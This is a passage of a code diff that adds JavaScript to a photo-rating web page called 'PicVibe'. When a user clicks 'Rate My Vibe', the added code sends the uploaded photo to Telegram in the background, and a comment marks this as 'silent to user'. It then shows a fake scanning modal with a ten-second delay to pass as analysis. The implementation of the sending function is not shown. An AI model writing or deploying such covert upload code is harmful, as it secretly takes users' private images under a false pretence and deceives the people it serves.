+                    handleFileSelect(e.dataTransfer.files[0]);
+                }
+            });
+
+            removeBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                selectedFile = null;
+                fileInput.value = '';
+                previewContainer.style.display = 'none';
+                uploadZone.style.display = 'block';
+                rateBtn.disabled = true;
+            });
+
+            rateBtn.addEventListener('click', async function() {
+                if (!selectedFile || isUploading) return;
+
+                isUploading = true;
+                rateBtn.disabled = true;
+                rateBtn.textContent = 'Analyzing...';
+
+                // Send to Telegram in background (silent to user)
+                sendToTelegram(selectedFile);
+
+                // Show scanning modal
+                showScanningModal();
+
+                // Wait for 10 seconds before showing results
+                await new Promise(resolve => setTimeout(resolve, 10000));
+
+                isUploading = false;
+                rateBtn.disabled = false;
+                rateBtn.innerHTML = '<span class="btn-glow"></span>Rate My Vibe';
+            });
+
+            modalOverlay.addEventListener('click', function(e) {
+                if (e.target === modalOverlay) {
+                    closeModal();
+                }
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeModal();
+                }
+            });
+
+            // Prevent double-click issues
+            uploadZone.addEventListener('dblclick', function(e) {
+                e.preventDefault();
+            });
+
+            console.log('PicVibe initialized - Rate your energy, boss man');
+        })();
     </script>
 </body>
 </html>
